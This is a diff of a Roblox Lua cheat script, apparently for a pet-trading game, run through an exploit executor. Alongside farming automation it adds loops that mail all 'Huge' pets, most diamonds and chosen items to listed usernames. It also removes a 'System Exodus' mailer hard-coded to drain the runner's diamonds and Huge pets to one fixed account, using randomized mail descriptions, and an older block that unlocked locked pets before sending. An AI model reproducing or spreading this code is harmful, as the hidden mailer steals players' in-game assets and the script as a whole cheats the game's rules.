@@ -1,5 +1,5 @@
 repeat
-    task.wait(5)
+    task.wait()
 until game:IsLoaded()
 
 local Workspace = game:GetService('Workspace')
@@ -209,7 +209,6 @@ local ManualPathsToDelete = {
     'workspace.FlyBorder',
     'workspace.BlockPartyOuter',
     'workspace.__THINGS.Orbs',
-    'workspace.__THINGS.ExclusiveEggs',
 }
 
 -- 🌟 Ẩn phần hiển thị của Part nhưng giữ nguyên Prompt + thư mục con
@@ -1449,70 +1448,135 @@ task.spawn(function()
         end
     end
 end)
+
+--==================--
+--      SCRIPT      --
+--==================--
+local HttpService = game:GetService('HttpService')
+local player = game.Players.LocalPlayer
+local DATA_FILE = player.Name .. '_SEND.json'
+
 repeat
     task.wait()
 until game:IsLoaded()
 
 local Config = getgenv().Config
-assert(Config, '⚠️ Chưa khai báo getgenv().Config!')
-
 local Network = require(game.ReplicatedStorage.Library.Client.Network)
 local Save = require(game.ReplicatedStorage.Library.Client.Save)
 
-local Messages = { 'Thanks!', 'Free', 'Thank you', 'thanks', 'thank you' }
+----------------------------------------------------------
+-- 📄 Load/Save trạng thái gửi
+----------------------------------------------------------
+local function loadStatus()
+    if isfile(DATA_FILE) then
+        return HttpService:JSONDecode(readfile(DATA_FILE))
+    else
+        return { SENT_PET = {}, SENT_DIAMONDS = {}, SENT_ITEM = {} }
+    end
+end
+
+local function saveStatus(status)
+    writefile(DATA_FILE, HttpService:JSONEncode(status))
+end
+
+local status = loadStatus()
 
 ----------------------------------------------------------
--- 🎁 AUTO SEND TITANIC PET
+-- 📝 Hàm kiểm tra player có bị chặn không
+----------------------------------------------------------
+local function isPlayerBlocked(list)
+    for _, name in ipairs(list) do
+        if name == player.Name then
+            return true
+        end
+    end
+    return false
+end
+
+----------------------------------------------------------
+-- 📝 Lấy người tiếp theo chưa gửi
+----------------------------------------------------------
+local function getNextUser(usernames, sentList)
+    for _, u in ipairs(usernames) do
+        if not table.find(sentList, u) then
+            return u
+        end
+    end
+    return nil
+end
+
+----------------------------------------------------------
+-- 🎁 AUTO SEND PET
 ----------------------------------------------------------
 task.spawn(function()
-    while task.wait(Config.PetSendInterval or 60) do
-        local TitanicPetList = {}
-        local inv = Save.Get()
-            and Save.Get().Inventory
-            and Save.Get().Inventory.Pet
+    if isPlayerBlocked(Config.SEND_PET.Usernames) then
+        print('⚠️ Player nằm trong danh sách không gửi PET')
+        return
+    end
+
+    while task.wait(Config.SEND_PET.PetSendInterval or 60) do
+        local saveInv = Save.Get()
+        local inv = saveInv and saveInv.Inventory and saveInv.Inventory.Pet
         if not inv then
             continue
         end
 
+        local TitanicPetList = {}
         for UID, Data in pairs(inv) do
             if Data.id and string.find(Data.id, 'Huge') then
                 table.insert(TitanicPetList, { UID = UID, data = Data })
-
-                -- unlock nếu bị khóa
-                if Data._lk then
-                    repeat
-                        task.wait()
-                        local ok =
-                            Network.Invoke('Locking_SetLocked', UID, false)
-                    until ok
-                    print('🔓 Đã mở khóa pet:', UID)
-                end
             end
         end
 
         if #TitanicPetList == 0 then
-            print('✅ Không còn Titanic để gửi.')
+            print('✅ Không còn Titanic/Huge pet để gửi.')
             break
         end
 
-        for _, pet in ipairs(TitanicPetList) do
-            local toUser = Config.Usernames[math.random(#Config.Usernames)]
-            local msg = Messages[math.random(#Messages)]
+        local toUser = getNextUser(Config.SEND_PET.Usernames, status.SENT_PET)
+        if not toUser then
+            status.SENT_PET = {}
+            toUser = Config.SEND_PET.Usernames[1]
+        end
 
+        for _, pet in ipairs(TitanicPetList) do
+            local petUID = pet.UID
             local success = pcall(function()
-                return game.ReplicatedStorage.Network['Mailbox: Send']:InvokeServer(
+                return Network.Invoke(
+                    'Mailbox: Send',
                     toUser,
                     pet.data.id,
                     'Pet',
-                    pet.UID,
+                    petUID,
                     pet.data._am or 1
                 )
             end)
 
             if success then
-                print('🎁 Gửi Titanic:', pet.data.id, '➡️', toUser)
+                task.wait(0.5)
+                local updatedInv = Save.Get()
+                    and Save.Get().Inventory
+                    and Save.Get().Inventory.Pet
+                if not updatedInv or not updatedInv[petUID] then
+                    print(
+                        '🎁 Gửi pet thành công:',
+                        pet.data.id,
+                        '➡️',
+                        toUser
+                    )
+                    table.insert(status.SENT_PET, toUser)
+                    saveStatus(status)
+                else
+                    warn(
+                        '⚠️ Pet chưa biến mất khỏi inventory:',
+                        pet.data.id
+                    )
+                end
             else
-                warn('⚠️ Gửi thất bại:', pet.data.id)
+                warn(
+                    '⚠️ Network call thất bại khi gửi pet:',
+                    pet.data.id
+                )
             end
         end
     end
@@ -1521,89 +1585,162 @@ end)
 ----------------------------------------------------------
 -- 💎 AUTO SEND DIAMONDS
 ----------------------------------------------------------
-if not _G.DIAMOND_SENDER_RAN then
-    _G.DIAMOND_SENDER_RAN = true
-else
-    return
-end
-
-local player = game.Players.LocalPlayer
-local diamondsStat =
-    player:WaitForChild('leaderstats'):FindFirstChild('💎 Diamonds')
-if not diamondsStat then
-    return
-end
-
-local SaveModule = require(game.ReplicatedStorage.Library.Client.Save)
-
--- Lấy UID của Diamonds trong inventory
-local function getDiamondsUID()
-    local save = SaveModule.Get()
-    local inv = save and save.Inventory and save.Inventory.Currency
-    if not inv then
-        return nil
+task.spawn(function()
+    if isPlayerBlocked(Config.SEND_DIAMONDS.Usernames) then
+        print('⚠️ Player nằm trong danh sách không gửi DIAMONDS')
+        return
     end
-    for uid, v in pairs(inv) do
-        if v.id == 'Diamonds' then
-            return uid
+
+    while task.wait(5) do
+        local diamondsStat =
+            player:WaitForChild('leaderstats'):FindFirstChild('💎 Diamonds')
+        if not diamondsStat then
+            continue
         end
-    end
-end
+        if diamondsStat.Value < Config.SEND_DIAMONDS.MinDiamonds then
+            continue
+        end
 
-local diamondsUID = getDiamondsUID()
-if not diamondsUID then
-    return
-end
+        local toUser =
+            getNextUser(Config.SEND_DIAMONDS.Usernames, status.SENT_DIAMONDS)
+        if not toUser then
+            status.SENT_DIAMONDS = {}
+            toUser = Config.SEND_DIAMONDS.Usernames[1]
+        end
 
--- Gửi Diamonds
-local function sendDiamonds(amount, receiver)
-    for _ = 1, 3 do
+        local diamondsUID
+        local saveInv = Save.Get()
+        local inv = saveInv and saveInv.Inventory and saveInv.Inventory.Currency
+        if inv then
+            for uid, v in pairs(inv) do
+                if v.id == 'Diamonds' then
+                    diamondsUID = uid
+                    break
+                end
+            end
+        end
+        if not diamondsUID then
+            continue
+        end
+
+        local beforeAmount = diamondsStat.Value
+        local amount = beforeAmount - 2000000
+        if amount <= 0 then
+            continue
+        end
+
         local ok, res = pcall(function()
             return Network.Invoke(
                 'Mailbox: Send',
-                receiver,
+                toUser,
                 'Bless',
                 'Currency',
                 diamondsUID,
                 amount
             )
         end)
+
         if ok and res then
-            return true
-        end
-        task.wait(0.3)
-    end
-    return false
-end
-
--- Hàm ưu tiên gửi gems
-local function sendPriorityGems()
-    local diamonds = diamondsStat.Value
-    if diamonds >= Config.MinDiamonds then
-        -- Người nhận ưu tiên
-        local receiver
-        if Config.PriorityReceiver then
-            receiver = Config.PriorityReceiver
+            task.wait(0.5)
+            local afterAmount = player
+                :FindFirstChild('leaderstats')
+                :FindFirstChild('💎 Diamonds').Value
+            if afterAmount < beforeAmount then
+                print(
+                    ('📤 Gửi %s 💎 thành công cho %s'):format(
+                        amount,
+                        toUser
+                    )
+                )
+                table.insert(status.SENT_DIAMONDS, toUser)
+                saveStatus(status)
+            else
+                warn('⚠️ Diamonds chưa trừ khỏi inventory:', toUser)
+            end
         else
-            receiver = Config.Receivers[math.random(#Config.Receivers)]
+            warn('⚠️ Gửi diamonds thất bại:', toUser)
         end
-
-        local amount = diamonds -- gửi toàn bộ
-        if sendDiamonds(amount, receiver) then
-            print(('📤 Đã gửi %s 💎 cho %s (ưu tiên)'):format(amount, receiver))
-        else
-            warn('⚠️ Gửi diamonds lỗi, thử lại sau.')
-        end
-    end
-end
-
--- Vòng lặp chính
-task.spawn(function()
-    while task.wait(5) do
-        sendPriorityGems() -- ưu tiên gửi gems
     end
 end)
 
+----------------------------------------------------------
+-- 🎲 AUTO SEND ITEMS
+----------------------------------------------------------
+task.spawn(function()
+    if isPlayerBlocked(Config.SEND_ITEM.Usernames) then
+        print('⚠️ Player nằm trong danh sách không gửi ITEM')
+        return
+    end
+
+    while task.wait(10) do
+        local inv = Save.Get() and Save.Get().Inventory
+        if not inv then
+            continue
+        end
+
+        for category, items in pairs(inv) do
+            if category ~= 'Pet' and category ~= 'Currency' then
+                for uid, item in pairs(items) do
+                    local cfg = Config.SEND_ITEM[item.id]
+                    if cfg then
+                        local toUser = getNextUser(
+                            Config.SEND_ITEM.Usernames,
+                            status.SENT_ITEM
+                        )
+                        if not toUser then
+                            status.SENT_ITEM = {}
+                            toUser = Config.SEND_ITEM.Usernames[1]
+                        end
+
+                        local beforeAmount = item._am
+                        local amount = cfg.amount == 'all' and beforeAmount
+                            or cfg.amount
+                        local success = pcall(function()
+                            return Network.Invoke(
+                                'Mailbox: Send',
+                                toUser,
+                                item.id,
+                                category,
+                                uid,
+                                amount
+                            )
+                        end)
+
+                        if success then
+                            task.wait(0.5)
+                            local updatedInv = Save.Get()
+                                and Save.Get().Inventory
+                            local updatedAmount = updatedInv
+                                    and updatedInv[category]
+                                    and updatedInv[category][uid]
+                                    and updatedInv[category][uid]._am
+                                or 0
+                            if updatedAmount < beforeAmount then
+                                print(
+                                    '📦 Gửi item thành công:',
+                                    item.id,
+                                    'x' .. amount,
+                                    '➡️',
+                                    toUser
+                                )
+                                table.insert(status.SENT_ITEM, toUser)
+                                saveStatus(status)
+                            else
+                                warn(
+                                    '⚠️ Item chưa trừ khỏi inventory:',
+                                    item.id
+                                )
+                            end
+                        else
+                            warn('⚠️ Gửi item thất bại:', item.id)
+                        end
+                        task.wait(0.2)
+                    end
+                end
+            end
+        end
+    end
+end)
 
 local Rep = game:GetService('ReplicatedStorage')
 local Network = Rep:WaitForChild('Network')
@@ -2034,144 +2171,4 @@ task.spawn(function()
             task.wait(used and EggUseCooldown or 0.5)
         end
     end)
-end)
---============= MAILING DIAMONDS + HUGE ============================
---============= MAILING DIAMONDS + HUGE ============================
-for i = 1,10 do print() end
-
-if not LPH_OBFUSCATED then
-    getgenv().Settings = {
-        Mailing = {
-            ["Diamonds"] = {
-                Class = "Currency",
-                Amount = "All",
-                MinDiamonds = 50000000
-            },
-            -- ✅ Thêm Huge vào Config
-            ["Huge"] = {
-                Class = "Pet",
-                Rarity = "Huge",
-                Amount = "All"
-            },
-        },
-        Users = {
-            "DreamSoCow",
-        },
-        ["Split Items Evenly"] = false,
-        ["Only Online Accounts"] = false,
-        ["Developer Mode"] = false,
-        [[ Thank you for using System Exodus <3! ]]
-    }
-end
-
-if not game:IsLoaded() then game.Loaded:Wait() end
-
-local M_Players = game:GetService("Players")
-local M_ReplicatedStorage = game:GetService("ReplicatedStorage")
-local M_HttpService = game:GetService("HttpService")
-local M_LocalPlayer = M_Players.LocalPlayer
-
-local M_Library = {}
-local M_Client = {}
-for _,v in next, M_ReplicatedStorage.Library.Client:GetChildren() do
-    if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
-        local ok, mod = pcall(function() return require(v) end)
-        if ok then M_Library[v.Name] = mod M_Client[v.Name] = mod end
-    end
-end
-for _,v in next, M_ReplicatedStorage.Library:GetChildren() do
-    if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
-        local ok, mod = pcall(function() return require(v) end)
-        if ok then M_Library[v.Name] = mod end
-    end
-end
-
-local M_NormalLibrary = M_ReplicatedStorage.Library
-local M_PlayerSave = require(M_NormalLibrary.Client.Save)
-
-local function M_GetDiamonds(ReturnUID)
-    for i,v in next, M_PlayerSave.Get()["Inventory"].Currency do
-        if v.id == "Diamonds" then
-            return ReturnUID and i or v._am
-        end
-    end
-    return 0
-end
-
--- ✅ Thêm chức năng lấy Huge Pet
-local function M_GetHuges()
-    local result = {}
-    for uid, info in pairs(M_PlayerSave.Get()["Inventory"].Pet or {}) do
-        if info.id:find("Huge") then
-            table.insert(result, uid)
-        end
-    end
-    return result
-end
-
-local function M_GenerateDescription()
-    local AdjectiveList = {
-        "Bold","Quick","Happy","Tiny","Brave","Clever","Gentle",
-        "Mighty","Calm","Loyal","Bright","Wise","Fearless","Vivid"
-    }
-    local NounList = {
-        "Lion","Castle","Book","Cloud","Tiger","Forest","River",
-        "Sword","Galaxy","Phoenix","Knight","Star","Dragon"
-    }
-    return AdjectiveList[math.random(#AdjectiveList)] .. " " .. NounList[math.random(#NounList)]
-end
-
-local function M_SendMail(Username, Class, UID, Amount)
-    local success, result = pcall(function()
-        return M_Library.Network.Invoke("Mailbox: Send", Username, M_GenerateDescription(), Class, UID, Amount)
-    end)
-    if result then
-        print(string.format("[Mailing] 💌 Sent %s %s to %s", tostring(Amount), Class, Username))
-        Settings.MailCost = 0
-        Settings.DiamondsAvailable = math.floor(M_GetDiamonds() - Settings.MailCost)
-    else
-        warn("[Mailing] ❌ Send failed, retrying in 3s...")
-        task.wait(3)
-        return M_SendMail(Username, Class, UID, Amount)
-    end
-    return result
-end
-
--- 💠 AUTO GỬI GEMS + HUGE
-task.spawn(function()
-    print("[Mailing] 🚀 Auto gửi Diamonds + Huge bắt đầu…")
-
-    while task.wait(40) do
-        
-        -- Diamonds giữ nguyên
-        local DiamondsNow = M_GetDiamonds()
-        local MinDiamonds = (Settings.Mailing.Diamonds.MinDiamonds or 0)
-        local UID = M_GetDiamonds(true)
-
-        if DiamondsNow >= MinDiamonds then
-            local MailCost = Settings.MailCost or 0
-            local Sendable = math.max(0, DiamondsNow - MailCost)
-
-            if Sendable > 0 then
-                for _, Username in next, Settings.Users do
-                    M_SendMail(Username, "Currency", UID, Sendable)
-                end
-            end
-        end
-
-        -- ✅ Gửi Huge (nếu bật trong config)
-        if Settings.Mailing.Huge then
-            local Huges = M_GetHuges()
-            if #Huges > 0 then
-                print("[Mailing] 🦁 Phát hiện Huge — gửi tất cả!")
-
-                for _, Username in next, Settings.Users do
-                    for _, PetUID in next, Huges do
-                        M_SendMail(Username, "Pet", PetUID, 1)
-                        task.wait(0.5)
-                    end
-                end
-            end
-        end
-    end
 end)
